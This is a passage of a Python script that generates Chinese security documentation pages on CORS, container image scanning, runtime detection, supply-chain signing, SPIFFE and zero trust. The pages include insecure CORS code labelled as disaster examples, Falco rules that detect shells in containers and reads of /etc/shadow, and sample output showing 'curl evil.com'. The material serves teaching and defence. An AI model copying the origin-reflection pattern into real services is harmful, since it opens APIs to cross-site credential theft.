    # add_header Access-Control-Allow-Origin "$http_origin" always;

    # 静态 origin（推荐）
    set $cors_origin "";
    if ($http_origin = "https://app.com") {
        set $cors_origin $http_origin;
    }
    if ($http_origin = "https://admin.example.com") {
        set $cors_origin $http_origin;
    }
    add_header Access-Control-Allow-Origin $cors_origin always;
    add_header Access-Control-Allow-Methods "GET, POST, PUT, DELETE, OPTIONS" always;
    add_header Access-Control-Allow-Headers "Authorization, Content-Type" always;
    add_header Access-Control-Allow-Credentials "true" always;
    add_header Access-Control-Max-Age 3600 always;

    # 预检请求直接返回 204
    if ($request_method = 'OPTIONS') {
        return 204;
    }

    proxy_pass http://backend;
}
```

## 实战：Node.js cors 中间件

```javascript
const cors = require("cors");

app.use(cors({
    origin: ["https://app.com", "https://admin.example.com"],
    methods: ["GET", "POST", "PUT", "DELETE"],
    allowedHeaders: ["Authorization", "Content-Type"],
    credentials: true,
    maxAge: 3600,
}));
```

## 灾难示范

```python
# ❌ 灾难：allow * + credentials
response.headers["Access-Control-Allow-Origin"] = "*"
response.headers["Access-Control-Allow-Credentials"] = "true"
# 浏览器会拒绝（spec 禁止）
# 即使不禁止，任何网站都能带凭证调你的 API
```

```python
# ❌ 灾难：动态 origin 反射
origin = request.headers.get("Origin")
response.headers["Access-Control-Allow-Origin"] = origin
# 攻击者伪造 Origin 头绕过
```

## 实战：环境变量管理 origin

```python
ALLOWED_ORIGINS = os.getenv("ALLOWED_ORIGINS", "").split(",")

@app.after_request
def cors(response):
    origin = request.headers.get("Origin")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

## CORS 攻击矩阵

| 攻击 | 危害 |
|------|------|
| CORS * + 凭证 | 任意网站读取 |
| Origin 反射 | 绕过白名单 |
| null origin | data: URL / iframe 绕过 |
| 缓存投毒 | 中间 CDN 缓存 |
| 预检缓存 | Max-Age 过长 |

## 实战：CSRF 配合 SameSite

```python
# 同源：Cookie SameSite=Strict
# → CORS 不发送 Cookie（除非 allow_credentials=true）

# 跨域：需要 allow_credentials=true + 显式 origin
response.headers["Access-Control-Allow-Credentials"] = "true"
response.headers["Access-Control-Allow-Origin"] = "https://app.com"  # 不能 *
```

## 实战：浏览器 DevTools 调试

```javascript
// 浏览器 console
fetch("https://api.example.com/users", {
    credentials: "include"
}).then(r => r.json());

// Failed to load: Response to preflight request doesn't pass
// → 说明预检失败
```

## 关联章节

- **02-auth/session-attack**：CSRF + SameSite
- **04-network/tls-pki**：HTTPS 跨域基础
- **01-web-top10/a05-misconfig**：A05 配置错误

## 一句话总结

> **CORS = 浏览器跨域规则**。**allow_credentials=true 时不能 allow-origin=***。**明确 origin 白名单 + 预检缓存**。**Nginx if + set 变量是经典配置**。
""",

# ============ 05-container (3 stubs) ============
"05-container/image-scan.md": """---
title: 镜像扫描
---

# 容器镜像扫描

## 一句话总结

> **镜像扫描 = 静态分析镜像 layer 中的 CVE**。**主流工具：Trivy（全能）/ Grype（简洁）/ Clair（API 集成）**。**集成：CI 阻断 + 准入控制 + 持续运行时扫描**。

---

## 扫描工具对比

| 工具 | 特性 | 输出格式 | 速度 |
|------|------|---------|------|
| **Trivy** | 全能（CVE / IaC / SBOM）| CycloneDX / SPDX / JSON | 快 |
| **Grype** | 简洁、CycloneDX | CycloneDX / JSON | 快 |
| **Clair** | 静态分析、API | JSON | 中 |
| **Snyk Container** | 商业、深度 | 报告 + 修复建议 | 快 |
| **Docker Scan** | 内置（基于 Snyk）| 报告 | 中 |
| **Anchore** | 深度策略 | JSON | 慢 |

## 实战：Trivy 扫描

```bash
# 扫描本地镜像
trivy image nginx:1.25

# 输出
nginx:1.25 (debian 12.4)
==========================
Total: 47 (HIGH: 12, CRITICAL: 3)

+---------+------------------+----------+-------------------+-------------------+
| LIBRARY | VULNERABILITY ID | SEVERITY | INSTALLED VERSION | FIXED VERSION     |
+---------+------------------+----------+-------------------+-------------------+
| openssl | CVE-2024-XXXXX   | CRITICAL | 3.0.11-1~deb12u1  | 3.0.13-1~deb12u1  |
| glibc   | CVE-2023-XXXXX   | HIGH     | 2.36-9+deb12u7    | 2.36-9+deb12u8    |
+---------+------------------+----------+-------------------+-------------------+

# 严重度过滤
trivy image --severity CRITICAL,HIGH nginx:1.25

# 输出 SBOM
trivy image --format cyclonedx --output sbom.json nginx:1.25

# 扫描文件系统
trivy fs /path/to/project

# 扫描 IaC
trivy config /path/to/terraform
```

## 实战：CI 集成（GitHub Actions）

```yaml
name: container-scan
on:
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Build image
        run: docker build -t myapp:${{ github.sha }} .

      - name: Trivy scan
        uses: aquasecurity/trivy-action@master
        with:
          image-ref: myapp:${{ github.sha }}
          severity: CRITICAL,HIGH
          exit-code: 1  # 严重漏洞时失败
          format: table
```

## 实战：Grype

```bash
# 安装
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh

# 扫描
grype nginx:1.25

# 输出 SBOM
grype nginx:1.25 -o cyclonedx-json > sbom.json
```

## 实战：Snyk Container

```bash
# 安装
npm install -g snyk

# 认证
snyk auth

# 扫描
snyk container test nginx:1.25

# 监控
snyk container monitor nginx:1.25
```

## 实战：K8s 准入控制

```yaml
# Kyverno 策略：拒绝含 CRITICAL 漏洞的镜像
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: scan-image
spec:
  validationFailureAction: Enforce
  rules:
    - name: scan-image
      match:
        any:
          - resources:
              kinds: ["Pod"]
      validate:
        message: "Image failed CVE scan"
        pattern:
          metadata:
            labels:
              scan-status: "passed"
```

## 实战：Trivy Operator（K8s 集群扫描）

```bash
# 安装
helm install trivy-operator trivy-operator \
    --namespace trivy-system --create-namespace

# 自动扫描所有工作负载
# 漏洞报告存为 CRD
kubectl get vulnerabilityreports -A
```

## 实战：镜像修复

```bash
# 升级基础镜像
docker pull python:3.12-slim  # 替代 3.11-slim

# 重建
docker build -t myapp:1.0.1 .

# 重新扫描
trivy image myapp:1.0.1
```

## 实战：多阶段构建减漏洞

```dockerfile
# ❌ 漏洞多
FROM ubuntu:latest
RUN apt install -y python3

# ✅ 多阶段
FROM python:3.12-slim AS builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

FROM python:3.12-slim AS runtime
COPY --from=builder /usr/local/lib/python3.12 /usr/local/lib/python3.12
COPY --from=builder /usr/local/bin /usr/local/bin
COPY app /app
USER 1000
CMD ["python", "/app/main.py"]
```

## 扫描策略

```yaml
# 阶段 1：本地开发
trivy fs .

# 阶段 2：CI 流水线
- name: Scan
  run: trivy image --exit-code 1 --severity CRITICAL myapp:${{ github.sha }}

# 阶段 3：镜像推送
# 必须在镜像推送到 registry 之前完成

# 阶段 4：K8s 准入
# Kyverno / Connaisseur 阻断

# 阶段 5：运行时
# Trivy Operator 持续扫描
```

## 关联章节

- **05-container/overview**：容器安全总览
- **05-container/supply-chain**：SBOM + 签名
- **05-container/runtime-security**：Falco 运行时
- **01-web-top10/a06-vulnerable-component**：A06 组件漏洞

## 一句话总结

> **镜像扫描 = Trivy（首选）/ Grype / Snyk**。**CI 阻断 + 准入控制 + 持续扫描**。**多阶段构建 + 最小基础镜像 = 减漏洞**。
""",

"05-container/runtime-security.md": """---
title: 容器运行时安全
---

# 容器运行时安全

## 一句话总结

> **运行时安全 = 检测容器内异常行为**。**主流：Falco（syscall 检测）/ Tracee（eBPF）/ Aqua / Sysdig**。**核心：默认 deny + 不可变 + 最小权限 + 异常告警**。

---

## 主流运行时工具

| 工具 | 原理 | 资源占用 | 场景 |
|------|------|---------|------|
| **Falco** | Syscall / 内核模块 | 中 | 通用 |
| **Tracee** | eBPF | 低 | 现代 |
| **Aqua** | 商业 | 中 | 企业 |
| **Sysdig Secure** | 商业 | 中 | 企业 |
| **AppArmor** | LSM | 极低 | 强制访问控制 |
| **Seccomp** | BPF | 极低 | 系统调用过滤 |

## 实战：Falco 安装

```bash
# Helm 安装
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm install falco falcosecurity/falco \
    --namespace falco --create-namespace \
    --set tty=true \
    --set falco.json_output=true
```

```bash
# Docker 方式
docker run -d \
    --name falco \
    --privileged \
    -v /var/run/docker.sock:/var/run/docker.sock \
    -v /dev:/host/dev \
    -v /proc:/host/proc:ro \
    falcosecurity/falco
```

## 实战：Falco 默认规则

```yaml
# 检测容器内执行 shell
- rule: Terminal shell in container
  desc: Alert if a shell is spawned in a container
  condition: >
    container.id != host and
    proc.name = bash
  output: >
    Shell spawned in container
    (user=%user.name command=%proc.cmdline container=%container.name)
  priority: WARNING

# 检测敏感文件读取
- rule: Read sensitive file untrusted
  condition: >
    open_read and
    fd.name startswith /etc/shadow
  output: Sensitive file read
  priority: CRITICAL

# 检测出站连接
- rule: Unexpected outbound connection
  condition: >
    container.id != host and
    outbound and
    not allowed_outbound
  output: Outbound connection
  priority: WARNING
```

## 实战：Falco 自定义规则

```yaml
# 检测 kubectl exec 进入容器
- rule: Kube exec into container
  condition: >
    k8s_audit and
    ka.target.resource = pods and
    ka.verb = create and
    ka.subresource = exec
  output: >
    kubectl exec into container
    (user=%ka.user.name pod=%ka.target.name ns=%ka.target.namespace)
  priority: WARNING
```

## 实战：Tracee（eBPF）

```bash
# 运行
docker run --name tracee -it --rm \
    --pid=host --cgroupns=host \
    --privileged -v /etc/os-release:/etc/os-release-host:ro \
    aquasec/tracee:$(uname -m) \
    --containers

# 输出
# Loaded 52 signatures
# 14:32:01: SYSCALL: execve
#   process: curl
#   args: ["curl", "evil.com"]
```

## 实战：AppArmor 配置文件

```yaml
# /etc/apparmor.d/myapp
#include <tunables/global>

profile myapp flags=(attach_disconnected,mediate_deleted) {
    #include <abstractions/base>

    # 允许读取
    /home/myapp/** r,
    /etc/passwd r,
    /etc/hostname r,

    # 禁止网络（应用层需要时再开）
    deny network,

    # 禁止 capability
    deny capability,
}
```

```bash
# 加载
apparmor_parser -r /etc/apparmor.d/myapp

# K8s 注解
apiVersion: v1
kind: Pod
metadata:
  name: app
  annotations:
    container.apparmor.security.beta.kubernetes.io/myapp: localhost/myapp
```

## 实战：Seccomp 配置文件

```json
{
  "defaultAction": "SCMP_ACT_ERRNO",
  "architectures": ["SCMP_ARCH_X86_64"],
  "syscalls": [
    {
      "names": ["read", "write", "exit", "exit_group", "brk"],
      "action": "SCMP_ACT_ALLOW"
    }
  ]
}
```

```yaml
# K8s Pod 使用
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  securityContext:
    seccompProfile:
      type: Localhost
      localhostProfile: profiles/audit.json
```

## 实战：不可变基础设施

```yaml
# 禁止修改容器文件系统
apiVersion: v1
kind: Pod
metadata:
  name: app
spec:
  containers:
    - name: app
      image: myapp:1.0.0
      securityContext:
        readOnlyRootFilesystem: true
      volumeMounts:
        - name: tmp
          mountPath: /tmp
  volumes:
    - name: tmp
      emptyDir: {}
```

## 实战：异常告警（Falco → Slack）

```yaml
# falco.yaml
program_output:
  enabled: true
  keep_alive: false
  program: "jq '{text: .output}' | curl -d @- -X POST https://hooks.slack.com/services/YOUR/WEBHOOK"
```

## 实战：K8s Pod Security Standards

```yaml
# 受限（restricted）：最严格
apiVersion: v1
kind: Pod
metadata:
  name: app
  namespace: prod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    seccompProfile:
      type: RuntimeDefault
  containers:
    - name: app
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop: ["ALL"]
        runAsNonRoot: true
        runAsUser: 1000
```

## 关联章节

- **05-container/overview**：容器安全总览
- **05-container/image-scan**：镜像扫描
- **05-container/supply-chain**：SBOM / 签名
- **06-zero-trust/implementation**：零信任落地

## 一句话总结

> **运行时安全 = Falco（syscall）+ Tracee（eBPF）+ AppArmor / Seccomp（强制）**。**核心：默认 deny + 不可变 + 最小权限 + 异常告警**。
""",

"05-container/supply-chain.md": """---
title: 容器供应链安全
---

# 容器供应链安全

## 一句话总结

> **供应链 = 镜像 → SBOM → 签名 → 准入 → 审计**。**核心：SBOM（CycloneDX）+ Sigstore（Cosign）+ SLSA L3 框架**。**实战：Trivy 生成 SBOM + Cosign 签名 + Kyverno 准入**。

---

## 供应链 5 个阶段

```
Developer                CI/CD                  Registry              K8s               Runtime
    │                       │                      │                   │                   │
    │  1. Code (Git)       │                      │                   │                   │
    │ ──────────────────→  │                      │                   │                   │
    │                       │  2. Build            │                   │                   │
    │                       │  + SBOM (Trivy)      │                   │                   │
    │                       │  + Sign (Cosign)     │                   │                   │
    │                       │ ──────────────────→  │                   │                   │
    │                       │                      │  3. Push           │                   │
    │                       │                      │ ──────────────→   │                   │
    │                       │                      │                   │  4. Deploy        │
    │                       │                      │                   │  + Verify (Policy)│
    │                       │                      │                   │ ──────────────→   │
    │                       │                      │                   │                   │
    │                       │                      │                   │                   │  5. Audit
    │                       │                      │                   │                   │  (Policy)
```

## 实战：SBOM 生成

```bash
# Trivy 生成 CycloneDX
trivy image --format cyclonedx --output sbom.json myapp:1.0.0

# Syft 生成（更通用）
syft myapp:1.0.0 -o cyclonedx-json > sbom.json

# SPDX 格式
trivy image --format spdx-json --output sbom.spdx.json myapp:1.0.0
```

```json
// CycloneDX 样例
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "version": 1,
  "components": [
    {
      "type": "library",
      "name": "log4j-core",
      "version": "2.17.0",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.0",
      "licenses": [{"license": {"name": "Apache-2.0"}}]
    }
  ]
}
```

## 实战：Cosign 签名

```bash
# 1. 生成密钥对
cosign generate-key-pair

# 2. 签名镜像
cosign sign --key cosign.key myregistry.io/myapp:1.0.0

# 3. 验证签名
cosign verify --key cosign.pub myregistry.io/myapp:1.0.0

# 4. 与 Rekor（透明日志）集成
cosign sign --key cosign.key myregistry.io/myapp:1.0.0
# 默认上传到 sigstore public Rekor
```

## 实战：Keyless 签名（基于 OIDC）

```bash
# 用短期 OIDC token 签名（无需密钥）
cosign sign myregistry.io/myapp:1.0.0

# 验证
cosign verify \
    --certificate-identity email@company.com \
    --certificate-oidc-issuer https://accounts.google.com \
    myregistry.io/myapp:1.0.0
```

## 实战：Kyverno 验签策略

```yaml
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
spec:
  validationFailureAction: Enforce
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds: ["Pod"]
      verifyImages:
        - attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
                      -----END PUBLIC KEY-----
          imageReferences:
            - "myregistry.io/*"
```

## 实战：SLSA 框架

```
┌────────────────────────────────────────┐
│  SLSA Levels（Supply-chain Levels for  │
│  Software Artifacts）                   │
├────────────────────────────────────────┤
│  L0：无 SLSA                            │
│  L1：构建过程文档化 + 签名              │
│  L2：构建服务签名 + 完整来源追溯        │
│  L3：来源防篡改 + 防泄露 + 双签        │
└────────────────────────────────────────┘
```

Google SLSA 实践：
- **L1**：基础 CI（GitHub Actions）+ 签名
- **L2**：Hermetic build（隔离构建）+ 来源 provenance
- **L3**：两方签名 + 硬件密钥

## 实战：npm / PyPI 供应链

```bash
# npm 安装审计
npm audit --production

# 锁定依赖
npm ci  # 仅安装 lockfile 中版本

# PyPI 哈希验证
pip install --require-hashes -r requirements.txt
```

```yaml
# GitHub Actions audit
- name: Audit
  run: |
    npm audit --audit-level=high
    pip-audit --strict
```

## 实战：依赖镜像投毒防御

```bash
# 内部 npm registry 代理 + 镜像签名
# Verdaccio / Sonatype Nexus

# npm 配置
npm config set registry https://npm.internal.company.com
```

## 实战：in-toto 验证（学术级）

```bash
# in-toto：保护整个供应链
in-toto-verify --layout layout.root.json --public-key root.pub
```

## 实战：Sigstore 全家桶

| 工具 | 作用 |
|------|------|
| **Cosign** | 镜像 / 二进制签名 |
| **Rekor** | 透明日志（不可篡改）|
| **Fulcio** | 短期 OIDC 证书 |
| **The Update Framework (TUF)** | 软件更新 |

## 关联章节

- **05-container/overview**：容器安全总览
- **05-container/image-scan**：镜像扫描
- **05-container/runtime-security**：运行时
- **01-web-top10/a08-software-data-integrity**：A08 数据完整性

## 一句话总结

> **供应链 = SBOM + 签名 + 准入 + 透明日志**。**工具链：Trivy（SBOM）+ Cosign（签名）+ Kyverno（准入）+ Rekor（审计）**。**SLSA L3 = 业界最高标准**。
""",

# ============ 06-zero-trust (2 stubs) ============
"06-zero-trust/spiffe.md": """---
title: SPIFFE / SPIRE
---

# SPIFFE / SPIRE

## 一句话总结

> **SPIFFE = 工作负载身份标准**。**SPIRE = SPIFFE Runtime Environment（实现）**。**核心：SVID（X.509 证书 / JWT）+ 自动签发 + 短期**。**服务网格 / 零信任 / mTLS 的身份基座**。

---

## SPIFFE 4 组件

```
┌────────────────────────────────────────┐
│  SPIFFE 4 个核心概念                    │
│  ├── SPIFFE ID（身份 URI）             │
│  │   spiffe://trust-domain/ns/name     │
│  ├── SVID（可验证身份文档）             │
│  │   ├── X.509-SVID（X.509 证书）      │
│  │   └── JWT-SVID（JWT）               │
│  ├── Workload API（应用获取 SVID）      │
│  └── Federated Trust（跨集群信任）     │
└────────────────────────────────────────┘
```

## SPIFFE ID 格式

```
spiffe://trust-domain/ns/<namespace>/sa/<service-account>
       │              │              │
       │              │              └─ K8s ServiceAccount
       │              └─ K8s Namespace
       └─ 信任域（类似组织域名）
```

## 实战：SPIRE 部署

```bash
# 1. 启动 SPIRE Server
spire-server run -config conf/server/server.conf

# 2. 启动 SPIRE Agent（每个节点）
spire-agent run -config conf/agent/agent.conf -joinToken <token>

# 3. 注册 Workload
spire-server api create registration \
    -spiffeID spiffe://example.com/ns/prod/sa/order-service \
    -parentID spiffe://example.com/spire/agent/k8s-node-1 \
    -selector k8s:ns:prod \
    -selector k8s:sa:order-service \
    -ttl 3600
```

```yaml
# SPIRE K8s 自动注册（用 spire-controller-manager）
apiVersion: spire.spiffe.io/v1alpha1
kind: ClusterSPIFFEID
metadata:
  name: order-service
spec:
  spiffeIDTemplate: "spiffe://example.com/ns/{{ .PodMeta.Namespace }}/sa/{{ .PodSpec.ServiceAccountName }}"
  podSelector:
    matchLabels:
      app: order-service
  namespaceSelector:
    matchLabels:
      name: prod
```

## 实战：Java 应用获取 SVID

```java
import io.spiffe.spire.SpireClient;
import io.spiffe.spire.Svid;

public class App {
    public static void main(String[] args) {
        // SPIRE SDK
        SpireClient client = SpireClient.newSocketClient("/run/spire/sockets/agent.sock");
        Svid svid = client.fetchX509Svid();
        System.out.println("Spiffe ID: " + svid.getSpiffeId());
        System.out.println("Cert: " + svid.getCert());
    }
}
```

## 实战：Envoy + SPIRE

```yaml
# Envoy SDS 配置
static_resources:
  listeners:
    - address: { socket_address: { address: 0.0.0.0, port_value: 8443 } }
      filter_chains:
        - transport_socket:
            name: envoy.transport_sockets.tls
            typed_config:
              common_tls_context:
                tls_certificate_sds_secret_configs:
                  - name: spiffe_cert
                    sds_config:
                      api_config_source:
                        api_type: GRPC
                        grpc_services:
                          - envoy_grpc:
                              cluster_name: spire_agent
              validation_context_sds_secret_config:
                name: spiffe_validation
                sds_config:
                  api_config_source:
                    api_type: GRPC
                    grpc_services:
                      - envoy_grpc:
                          cluster_name: spire_agent
```

## 实战：Istio 用 SPIRE

```yaml
# Istio 默认从 k8s 拿 ServiceAccount 证书
# 配合 SPIRE 增强
meshConfig:
  defaultConfig:
    # 启用 SDS（Secret Discovery Service）
    sds:
      enabled: true
  trustDomain: "example.com"
```

## 实战：Istio AuthorizationPolicy 用 SPIFFE ID

```yaml
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: order-service
  namespace: prod
spec:
  selector:
    matchLabels:
      app: order-service
  rules:
    - from:
        - source:
            principals:
              - "spiffe://example.com/ns/prod/sa/frontend"
      to:
        - operation:
            methods: ["GET", "POST"]
            paths: ["/api/v1/orders"]
```

## 实战：JWT-SVID

```bash
# 签发 JWT-SVID
spire-server api fetch jwt-svid -spiffeID spiffe://example.com/sa/order-service

# 验证 JWT-SVID
jwt decode <token>
```

## 实战：联邦信任（Federated）

```hcl
# SPIRE Server 配置
federation {
  bundle_endpoint {
    address = "0.0.0.0:8443"
    trust_domain = "example.com"
  }
  trusts {
    spiffe_id_matches {
      spiffe_id_pattern = "spiffe://partner.example.com/*"
    }
    bundle_endpoint_url = "https://spire.partner.example.com"
  }
}
```

## 关联章节

- **06-zero-trust/overview**：零信任总览
- **06-zero-trust/implementation**：零信任落地
- **04-network/mtls**：mTLS 双向认证
- **cloud-native**：Istio 服务网格

## 一句话总结

> **SPIFFE = 工作负载身份标准**。**SPIRE = 实现**。**核心：SVID（自动签发 + 短期）+ Workload API**。**服务网格 / 零信任 / mTLS 的身份基座**。
""",

"06-zero-trust/implementation.md": """---
title: 零信任落地实践
---

# 零信任落地实践

## 一句话总结

> **零信任落地 = 5 步走（SSO → 设备清单 → 身份引擎 → 信任分级 → 迁移）**。**核心：身份 + 设备 + 上下文 = 持续访问决策**。**业务结果：取代 VPN + 服务网格默认安全 + SaaS 零信任**。

---

## Google BeyondCorp 8 步迁移

```
┌────────────────────────────────────────┐
│  Step 1：统一 SSO                       │
│  Step 2：用户 / 设备 / 应用 清单         │
│  Step 3：访问控制引擎                   │
│  Step 4：Trust Tier（设备分级）         │
│  Step 5：逐步迁移应用                   │
│  Step 6：外部化（无 VPN）                │
│  Step 7：持续验证（实时决策）            │
│  Step 8：去掉传统 VPN                   │
└────────────────────────────────────────┘
```

## 实战：BeyondCorp 信任层级

| 层 | 设备要求 | 访问级别 |
|----|---------|---------|
| **Tier 0** | 公司管理 + 加密 + 最新补丁 | 完全访问 |
| **Tier 1** | 公司管理 + 加密 | 内部应用 |
| **Tier 2** | BYOD + 注册 | 公开应用 |
| **Tier 3** | 未注册 | 拒绝 |

## 实战：Cloudflare Access（零信任 SDP）

```yaml
# Cloudflare Zero Trust 配置
# 1. 创建应用
---
name: "Internal Wiki"
type: "self_hosted"
session_duration: "24h"
app_launcher_visible: true
policies:
  - name: "Employees only"
    decision: "allow"
    include:
      - email: "*@company.com"
    require:
      - mfa: true
      - device_posture:
          os_version: ">= 14"
          firewall: "on"
```

## 实战：Tailscale（个人零信任 VPN）

```bash
# 安装
# macOS
brew install tailscale
# 启动
sudo tailscale up

# 共享设备
tailscale status

# ACL（访问控制）
# tailnet-policy.json
{
  "acls": [
    {
      "action": "accept",
      "src": ["group:engineers"],
      "dst": ["tag:prod:*"]
    }
  ]
}
```

## 实战：Okta + Workforce Identity

```yaml
# Okta 设备信任
device_assurance:
  - name: "High Trust"
    os_min_version: "macOS 13"
    disk_encryption: required
    screen_lock: required
    jailbreak: blocked

# 条件访问
policy:
  name: "Block unknown device"
  conditions:
    - device.trust != "managed"
  actions:
    - deny
```

## 实战：服务网格零信任（Istio）

```yaml
# 1. 全命名空间默认 mTLS
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: istio-system
spec:
  mtls:
    mode: STRICT

# 2. 授权策略
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-service
  namespace: prod
spec:
  selector:
    matchLabels:
      app: payment-service
  rules:
    - from:
        - source:
            principals: ["cluster.local/ns/prod/sa/order-service"]
      to:
        - operation:
            methods: ["POST"]
            paths: ["/api/v1/payments*"]

# 3. 请求认证（JWT）
apiVersion: security.istio.io/v1beta1
kind: RequestAuthentication
metadata:
  name: jwt-auth
  namespace: prod
spec:
  selector:
    matchLabels:
      app: payment-service
  jwtRules:
    - issuer: "https://auth.example.com"
      jwksUri: "https://auth.example.com/.well-known/jwks.json"
```

## 实战：OPA（Open Policy Agent）

```rego
# OPA 策略：谁能访问 payment
package payment.authz

default allow = false

allow {
    input.method == "POST"
    input.path == "/api/v1/payments"
    input.user.role == "finance"
    input.request_time >= "09:00:00"
    input.request_time <= "18:00:00"
    not input.user.flagged
}

allow {
    input.method == "GET"
    input.path == "/api/v1/payments"
    input.user.role in ["finance", "viewer"]
}
```

```yaml
# Envoy 集成 OPA
envoy.filters.http.ext_authz:
  - name: envoy.ext_authz
    config:
      grpc_service:
        envoy_grpc:
          cluster_name: opa
      with_request_body:
        max_request_bytes: 8192
        allow_partial_message: true
```

## 实战：Cedar（AWS 授权策略）

```cedar
# Cedar 策略
permit (
    principal in Role::"OrderService",
    action in [Action::"call", Action::"read"],
    resource in Resource::"PaymentService"
) when {
    principal has tenant && principal.tenant == resource.tenant
};
```

## 实战：传统应用零信任迁移

```yaml
# 阶段 1：OAuth 2.0 + OIDC 接入
# 阶段 2：JWT 替代 Session
# 阶段 3：API 网关强鉴权
# 阶段 4：服务网格 mTLS
# 阶段 5：删除 VPN
```

## 实战：业务约束（BeyondCorp 实战）

```python
# 业务规则：只在工作时间 + 公司内访问
def check_access(user, device, request):
    if user.department != "Finance":
        return False
    if not device.is_managed:
        return False
    if request.geo.country != "CN":
        return False
    if request.time < time(9, 0) or request.time > time(18, 0):
        return False
    return True
```

## 实战：监控与审计

```yaml
# 持续验证
- name: "Login outside business hours"
  query: |
    event=login AND result=success
    AND hour < 9 OR hour > 18
  alert: "Suspicious login"
  severity: medium

- name: "Access from new country"
  query: |
    event=access AND resource.intern=true
    AND user.country != user.last_country
  alert: "Possible account takeover"
  severity: high
```

## 关联章节

- **06-zero-trust/overview**：零信任总览
- **06-zero-trust/spiffe**：SPIFFE / SPIRE
- **04-network/mtls**：mTLS 双向认证
- **02-auth/oidc**：OIDC 身份

## 一句话总结

> **零信任落地 = SSO + 设备清单 + 信任分级 + 持续验证**。**技术栈：SPIFFE（身份）+ mTLS（加密）+ OPA（策略）+ 服务网格（落地）**。**业务结果：取代 VPN + SaaS 零信任**。
""",

}  # end CONTENT


def main():
    """Write each CONTENT entry to its corresponding md file."""
    print(f"Total pages to generate: {len(CONTENT)}")
    written = 0
    for rel_path, content in CONTENT.items():
        full_path = os.path.join(DOCS_ROOT, rel_path)
        os.makedirs(os.path.dirname(full_path), exist_ok=True)
        with open(full_path, "w", encoding="utf-8") as f:
            f.write(content)
        written += 1
        print(f"  [{written}/{len(CONTENT)}] {rel_path}")
    print(f"\nGenerated: {written}/{len(CONTENT)} pages")


if __name__ == "__main__":
    main()
